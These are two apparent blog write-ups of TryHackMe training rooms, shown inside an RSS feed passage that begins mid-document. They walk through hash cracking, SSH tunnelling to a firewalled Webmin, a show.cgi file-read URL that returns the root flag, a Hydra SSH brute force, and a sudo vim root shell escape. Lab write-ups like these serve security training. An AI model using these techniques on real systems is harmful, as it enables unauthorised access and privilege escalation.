1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2020-08-24 15:31<span style="color:#f92672">)</span> 2.941g/s 8673Kp/s 8673Kc/s 8426KC/s vimivi..vainlove
Use the <span style="color:#e6db74">&#34;--show --format=Raw-SHA256&#34;</span> options to display all of the cracked passwords reliably
Session completed

</code></pre></div><blockquote>
<p>Question #2 What is the de-hashed password?</p>
</blockquote>
<p>We answered that with the ouput from John.</p>
<blockquote>
<p>Question #3 Now you have a password and username. Try SSH&rsquo;ing onto the machine.What is the user flag?</p>
</blockquote>
<p>With the password we can now SSH into the computer:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/Documents/THM/gameZone$ ssh agent47@10.10.89.82
The authenticity of host <span style="color:#e6db74">&#39;10.10.89.82 (10.10.89.82)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:mpNHvzp9GPoOcwmWV/TMXiGwcqLIsVXDp5DvW26MFi8.
</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.89.82<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.
</span><span style="color:#e6db74">agent47@10.10.89.82&#39;</span>s password: 
Welcome to Ubuntu 16.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-159-generic x86_64<span style="color:#f92672">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

<span style="color:#ae81ff">109</span> packages can be updated.
<span style="color:#ae81ff">68</span> updates are security updates.


Last login: Fri Aug <span style="color:#ae81ff">16</span> 17:52:04 <span style="color:#ae81ff">2019</span> from 192.168.1.147
agent47@gamezone:~$ ls -al
total <span style="color:#ae81ff">28</span>
drwxr-xr-x <span style="color:#ae81ff">3</span> agent47 agent47 <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2019</span> .
drwxr-xr-x <span style="color:#ae81ff">3</span> root    root    <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> ..
lrwxrwxrwx <span style="color:#ae81ff">1</span> root    root       <span style="color:#ae81ff">9</span> Aug <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2019</span> .bash_history -&gt; /dev/null
-rw-r--r-- <span style="color:#ae81ff">1</span> agent47 agent47  <span style="color:#ae81ff">220</span> Aug <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> .bash_logout
-rw-r--r-- <span style="color:#ae81ff">1</span> agent47 agent47 <span style="color:#ae81ff">3771</span> Aug <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> .bashrc
drwx------ <span style="color:#ae81ff">2</span> agent47 agent47 <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2019</span> .cache
-rw-r--r-- <span style="color:#ae81ff">1</span> agent47 agent47  <span style="color:#ae81ff">655</span> Aug <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2019</span> .profile
-rw-rw-r-- <span style="color:#ae81ff">1</span> agent47 agent47   <span style="color:#ae81ff">33</span> Aug <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2019</span> user.txt
agent47@gamezone:~$ cat user.txt
<span style="color:#f92672">{</span>redacted_user_flag<span style="color:#f92672">}</span>

</code></pre></div><p>And there&rsquo;s our answer.</p>
<h2 id="task-5-exposing-services-with-reverse-ssh-tunnels">[Task 5] Exposing services with reverse SSH tunnels</h2>
<p>Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.</p>
<p>-L is a local tunnel (YOU &lt;&ndash; CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 <a href="mailto:user@example.com">user@example.com</a>. Going to localhost:9000 on your machine, will load imgur traffic using your other server.</p>
<p>-R is a remote tunnel (YOU &ndash;&gt; CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.</p>
<p>e will use a tool called ss to investigate sockets running on a host.</p>
<p>If we run <strong>ss -tulpn</strong> it will tell us what socket connections are running</p>
<p>Argument	Description
-t	Display TCP sockets
-u	Display UDP sockets
-l	Displays only listening sockets
-p	Shows the process using the socket
-n	Doesn&rsquo;t resolve service names</p>
<blockquote>
<p>Questions #1 How many TCP sockets are running?</p>
</blockquote>
<p>Let&rsquo;s run <strong>ss</strong> and see what it shows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
agent47@gamezone:~$ ss -tulpn
Netid  State      Recv-Q Send-Q           Local Address:Port                          Peer Address:Port              
udp    UNCONN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>                            *:68                                       *:*                  
udp    UNCONN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">0</span>                            *:10000                                    *:*                  
tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">80</span>                   127.0.0.1:3306                                     *:*                  
tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                          *:10000                                    *:*                  
tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                          *:22                                       *:*                  
tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                         :::80                                      :::*                  
tcp    LISTEN     <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>                         :::22                                      :::*     
</code></pre></div><p>We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!</p>
<p>From our local machine, run:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -L 10000:localhost:10000 &lt;username&gt;@&lt;ip&gt;
</code></pre></div><p>Let&rsquo;s run that SSH:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~/Documents/THM/gameZone$ ssh -L 10000:localhost:10000 agent47@10.10.89.82
agent47@10.10.89.82<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
Welcome to Ubuntu 16.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-159-generic x86_64<span style="color:#f92672">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

<span style="color:#ae81ff">109</span> packages can be updated.
<span style="color:#ae81ff">68</span> updates are security updates.


Last login: Mon Aug <span style="color:#ae81ff">24</span> 14:34:33 <span style="color:#ae81ff">2020</span> from 10.13.0.34

</code></pre></div><blockquote>
<p>Question #2 What is the name of the exposed CMS?</p>
</blockquote>
<p>Once complete, in your browser type <strong>localhost:10000</strong> and you can access the newly-exposed webserver.
When we do that, we see a <strong>Webmin</strong> login form.</p>
<blockquote>
<p>Question #3 What is the CMS version?</p>
</blockquote>
<p>At this point we do have a username and password, so let&rsquo;s login to see the Webmin logged user page. With that we should have the information we need for Question number 3.</p>
<h2 id="task-6-privilege-escalation-with-metasploit">[Task 6] Privilege Escalation with Metasploit</h2>
<p>Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.</p>
<p>Before we jump to <strong>Metasploit</strong> let&rsquo;s run <strong>searchsploit webmin 1.580</strong> to see if we can get a bit more of details on the available exploits:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kali@kali:~$ searchsploit webmin 1.580
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
Webmin 1.580 - <span style="color:#e6db74">&#39;/file/show.cgi&#39;</span> Remote Command Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>               | unix/remote/21851.rb
Webmin &lt; 1.920 - <span style="color:#e6db74">&#39;rpc.cgi&#39;</span> Remote Code Execution <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>                       | linux/webapps/47330.rb
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

</code></pre></div><p>We now know there is Remote Command Execution vulnerability availble and also a Remote Code Execution as well. Let&rsquo;s run <strong>msfconsole</strong> and see how we can exploit this CMS with Metasploit.</p>
<p>After failing for a while, I took a look on google to see if we can find the module itself to see what it does. Turns out its rather easy, it just uses the <strong>show.cgi</strong> component to read out any file passes into it. With this we can just run this on our local machine browser and get the root flag:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://localhost:10000/file/show.cgi/root/root.txt

</code></pre></div><p>Once we run that command the browser will read out the contents of root.txt and give us the answer to the last Question:</p>
<blockquote>
<p>Question #1 What is the root flag?</p>
</blockquote>
<p>a4b94{redacted_root_flag_XD}</p>
<p>As usual, happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
</div>
]]></content>
        </item>
        
        <item>
            <title>EasyCTF_writeup.sh</title>
            <link>https://tzero86-bits.netlify.app/posts/easyctf_writeup/</link>
            <pubDate>Fri, 21 Aug 2020 14:37:34 -0400</pubDate>
            
            <guid>https://tzero86-bits.netlify.app/posts/easyctf_writeup/</guid>
            <description>THM - EasyCTF/SimpleCTF Writeup Welcome to my second write-up for a TryHackme machine, in this case we&amp;rsquo;ll be solving EasyCTF or should I say SimpleCTF It seems to be called as both by looking at the room name and URL. Anyways, I invite you to try out this room on TryHackme by following the link below.
 Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules.</description>
            <content type="html"><![CDATA[<h2 id="thm---easyctfsimplectf-writeup">THM - EasyCTF/SimpleCTF Writeup</h2>
<p>Welcome to my second write-up for a TryHackme machine, in this case we&rsquo;ll be solving <strong>EasyCTF</strong> or should I say <strong>SimpleCTF</strong> It seems to be called as both by looking at the room name and URL. Anyways, I invite you to try out this room on TryHackme by following the link below.</p>
<ul>
<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/easyctf">clicking this link</a>.</li>
<li><strong>PLEASE NOTE:</strong> Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
</ul>
<blockquote>
<p>Question #1: How many services are running under port 1000?</p>
</blockquote>
<p>First let&rsquo;s fire up a <strong>Nmap</strong> scan to see if we can identify any services, making sure we skip the initial ping <strong>[-Pn]</strong>, scan all ports <strong>[-p-]</strong>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
└─$ sudo nmap -A -Pn -p- -T4  10.10.251.248
<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> tzero86: 
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-20 20:06 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.251.248
Host is up <span style="color:#f92672">(</span>0.35s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65533</span> filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
|_Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.0.34
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was <span style="color:#ae81ff">2</span>
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
| http-robots.txt: <span style="color:#ae81ff">2</span> disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
Aggressive OS guesses: Linux 3.10 - 3.13 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Crestron XPanel control system    <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, ASUS RT-N56U WAP <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, L  inux 3.2 <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, HP P2000 G3 NAS device <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span> Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>86%<span style="color:#f92672">)</span>, Infomir MAG-250 set-top box <span style="color:#f92672">(</span>86%<span style="color:#f92672">)</span>      
No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.                       
Network Distance: <span style="color:#ae81ff">4</span> hops                                                        
Service Info: OS: Unix

TRACEROUTE <span style="color:#f92672">(</span>using port 80/tcp<span style="color:#f92672">)</span>
HOP RTT       ADDRESS
<span style="color:#ae81ff">1</span>   234.68 ms 10.13.0.1
<span style="color:#ae81ff">2</span>   ... <span style="color:#ae81ff">3</span>
<span style="color:#ae81ff">4</span>   376.88 ms 10.10.251.248

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 540.83 seconds
</code></pre></div><p>With this scan we now we have two services running (under port 1000):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">21</span> - vsFTPd 3.0.3
<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span> 80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</code></pre></div><p>Our extended scan with <strong>autorecon</strong> was returned SSH on port 2222 as well:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
└─$ autorecon 10.10.251.248                                                <span style="color:#ae81ff">1</span> 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Scanning target 10.10.251.248
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-top-20-udp on 10.10.251.248
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-quick on 10.10.251.248
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-full-tcp on 10.10.251.248
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:10:28<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">2</span> tasks still running on 10.10.251.248
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Service detection nmap-quick on 10.10.251.248 finished successfully in <span style="color:#ae81ff">1</span> minute, <span style="color:#ae81ff">1</span> second
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ftp on tcp/21 on target 10.10.251.248
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found http on tcp/80 on target 10.10.251.248
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ssh on tcp/2222 on target 10.10.251.248
</code></pre></div><p>And with this scan we can answer the second question.</p>
<blockquote>
<p>Question #2: What is running on the higher port?</p>
</blockquote>
<p>Let&rsquo;s move on to the next one.</p>
<blockquote>
<p>Question #3: What&rsquo;s the CVE you&rsquo;re using against the application?</p>
</blockquote>
<p>So we need to look for a vulnerability to exploit. Let&rsquo;s see if we can find anything related to <strong>vsFTPd 3.0.3</strong> or related to <strong>Apache HTTPd 2.4.18</strong>.</p>
<p>The first thing we know about the FTP service running on port 21 is that it has anonymous access enabled. So let&rsquo;s connect to it and maybe download all the files if there is anything interesting that can aid us.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
└─$ ftp  10.10.251.248 <span style="color:#ae81ff">21</span>                                            
Connected to 10.10.251.248.
<span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
Name <span style="color:#f92672">(</span>10.10.251.248:tzero86<span style="color:#f92672">)</span>: anonymous
<span style="color:#ae81ff">230</span> Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; dir
<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
<span style="color:#ae81ff">150</span> Here comes the directory listing.
drwxr-xr-x    <span style="color:#ae81ff">2</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2019</span> pub
<span style="color:#ae81ff">226</span> Directory send OK.
ftp&gt; cd pub
<span style="color:#ae81ff">250</span> Directory successfully changed.
ftp&gt; ls
<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
<span style="color:#ae81ff">150</span> Here comes the directory listing.
-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">166</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2019</span> ForMitch.txt
<span style="color:#ae81ff">226</span> Directory send OK.
</code></pre></div><p>As we can see there is a potentially interesting file called <strong>ForMitch.txt</strong>, which at the very least already gives us one username to try on the SSH port.</p>
<p>Let&rsquo;s download the file from the FTP, we can use this command to download all files directly:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF/FTPFiles<span style="color:#f92672">]</span>
└─$ wget -m --no-passive ftp://anonymous:anonymous@10.10.251.248                         
--2020-08-20 20:39:42--  ftp://anonymous:*password*@10.10.251.248/
<span style="color:#f92672">=</span>&gt; ‘10.10.251.248/.listing’
Connecting to 10.10.251.248:21... connected.
Logging in as anonymous ... Logged in!
<span style="color:#f92672">==</span>&gt; SYST ... <span style="color:#66d9ef">done</span>.    <span style="color:#f92672">==</span>&gt; PWD ... <span style="color:#66d9ef">done</span>.
<span style="color:#f92672">==</span>&gt; TYPE I ... <span style="color:#66d9ef">done</span>.  <span style="color:#f92672">==</span>&gt; CWD not needed.
<span style="color:#f92672">==</span>&gt; PORT ... <span style="color:#66d9ef">done</span>.    <span style="color:#f92672">==</span>&gt; LIST ... <span style="color:#66d9ef">done</span>.
10.10.251.248/.listing      <span style="color:#f92672">[</span> &lt;<span style="color:#f92672">=</span>&gt;                           <span style="color:#f92672">]</span>     <span style="color:#ae81ff">180</span>  --.-KB/s    in 0s      
2020-08-20 20:39:46 <span style="color:#f92672">(</span>33.6 MB/s<span style="color:#f92672">)</span> - ‘10.10.251.248/.listing’ saved <span style="color:#f92672">[</span>180<span style="color:#f92672">]</span>
--2020-08-20 20:39:46--  ftp://anonymous:*password*@10.10.251.248/pub/
<span style="color:#f92672">=</span>&gt; ‘10.10.251.248/pub/.listing’
<span style="color:#f92672">==</span>&gt; CWD <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span> /pub ... <span style="color:#66d9ef">done</span>.
<span style="color:#f92672">==</span>&gt; PORT ... <span style="color:#66d9ef">done</span>.    <span style="color:#f92672">==</span>&gt; LIST ... <span style="color:#66d9ef">done</span>.

10.10.251.248/pub/.list     <span style="color:#f92672">[</span> &lt;<span style="color:#f92672">=</span>&gt;                           <span style="color:#f92672">]</span>     <span style="color:#ae81ff">189</span>  --.-KB/s    in 0s      

2020-08-20 20:39:48 <span style="color:#f92672">(</span>39.3 MB/s<span style="color:#f92672">)</span> - ‘10.10.251.248/pub/.listing’ saved <span style="color:#f92672">[</span>189<span style="color:#f92672">]</span>

--2020-08-20 20:39:48--  ftp://anonymous:*password*@10.10.251.248/pub/ForMitch.txt
           <span style="color:#f92672">=</span>&gt; ‘10.10.251.248/pub/ForMitch.txt’
<span style="color:#f92672">==</span>&gt; CWD not required.
<span style="color:#f92672">==</span>&gt; PORT ... <span style="color:#66d9ef">done</span>.    <span style="color:#f92672">==</span>&gt; RETR ForMitch.txt ... <span style="color:#66d9ef">done</span>.
Length: <span style="color:#ae81ff">166</span>

10.10.251.248/pub/ForMi 100%<span style="color:#f92672">[==============================</span>&gt;<span style="color:#f92672">]</span>     <span style="color:#ae81ff">166</span>  --.-KB/s    in 0s      

2020-08-20 20:39:49 <span style="color:#f92672">(</span><span style="color:#ae81ff">345</span> KB/s<span style="color:#f92672">)</span> - ‘10.10.251.248/pub/ForMitch.txt’ saved <span style="color:#f92672">[</span>166<span style="color:#f92672">]</span>

FINISHED --2020-08-20 20:39:49--
Total wall clock time: 7.1s
Downloaded: <span style="color:#ae81ff">3</span> files, <span style="color:#ae81ff">535</span> in 0s <span style="color:#f92672">(</span>1.06 MB/s<span style="color:#f92672">)</span>

</code></pre></div><p>When we open the file we get another bit of information, Mitch seems to have a very bad habit of using weak passwords.</p>
<pre><code>Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
</code></pre><p>So lets attempt to crack it, shall we? Since we know <strong>mitch</strong> is probably a valid username, let&rsquo;s try to crack the SSH login with <strong>hydra</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
└─$ hydra -l mitch -P <span style="color:#e6db74">&#34;/usr/share/seclists/Passwords/Common-Credentials/best110.txt&#34;</span> -e nsr -s <span style="color:#ae81ff">2222</span> -o <span style="color:#e6db74">&#34;/home/kali/Documents/THM/easyCTF/results/10.10.251.248/scans/tcp_2222_ssh_hydra.txt&#34;</span> ssh://10.10.49.87
Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.

Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-21 13:04:27
<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">113</span> login tries <span style="color:#f92672">(</span>l:1/p:113<span style="color:#f92672">)</span>, ~8 tries per task
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://10.10.49.87:2222/
<span style="color:#f92672">[</span>2222<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.10.49.87   login: mitch   password: ******
<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2020-08-21 13:05:22
</code></pre></div><p>There we go, we have a user and pass to connect to SSH. With this we can answer the following room questions:</p>
<blockquote>
<p>Question #5 What&rsquo;s the password?</p>
</blockquote>
<blockquote>
<p>Question #6 Where can you login with the details obtained?</p>
</blockquote>
<p>Let&rsquo;s check the SSH login out:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
└─$ ssh mitch@10.10.49.87 -p <span style="color:#ae81ff">2222</span>                                                                                              <span style="color:#ae81ff">255</span> ⨯
The authenticity of host <span style="color:#e6db74">&#39;[10.10.49.87]:2222 ([10.10.49.87]:2222)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span><span style="color:#e6db74">Warning: Permanently added &#39;</span><span style="color:#f92672">[</span>10.10.49.87<span style="color:#f92672">]</span>:2222<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.
</span><span style="color:#e6db74">mitch@10.10.49.87&#39;</span>s password: 
Welcome to Ubuntu 16.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-58-generic i686<span style="color:#f92672">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

<span style="color:#ae81ff">0</span> packages can be updated.
<span style="color:#ae81ff">0</span> updates are security updates.

Last login: Mon Aug <span style="color:#ae81ff">19</span> 18:13:41 <span style="color:#ae81ff">2019</span> from 192.168.0.190
$ ls
user.txt
$ cat user.txt
<span style="color:#f92672">{</span>User_flag_value_here<span style="color:#f92672">}</span>
$ cd ..
$ ls
mitch  sunbath
$ 
</code></pre></div><p>Let&rsquo;s review where we are at. We managed to get into the FTP server with anonymous login, we download a file for Mitch and got information that he uses bad insecure passwords. We then used Hydra to brute force the password and got the SSH password. We logged into SSH as Mitch and found out the user.txt value. We also know from looking a bit on the SSH, there is another username <strong>sunbath</strong>.</p>
<p>With this we can answer some questions from the room already. Still no idea what CVE we should be using for Question 2. But we can answer the following:</p>
<blockquote>
<p>Question #7: What&rsquo;s the user flag?</p>
</blockquote>
<blockquote>
<p>Question #8: Is there any other user in the home directory? What&rsquo;s its name?</p>
</blockquote>
<p>The next question ask us if we can use anything to leverage root privileges, let&rsquo;s check in the current SSH session if our user <strong>mitch</strong> has any access:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -l
User mitch may run the following commands on Machine:
    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/vim
</code></pre></div><p>This let us answer question 9:</p>
<blockquote>
<p>Question #9: What can you leverage to spawn a privileged shell?</p>
</blockquote>
<p>We now know Mitch can run <strong>vim</strong> as root. Once inside vim we press <strong>ESC</strong> then type in <strong>:!bash</strong> and press enter, just follow my steps and shown below:</p>
<p><img src="/img/Vim_Exploit_Sudo.gif" alt="Priv Esc with vim running as sudo"></p>
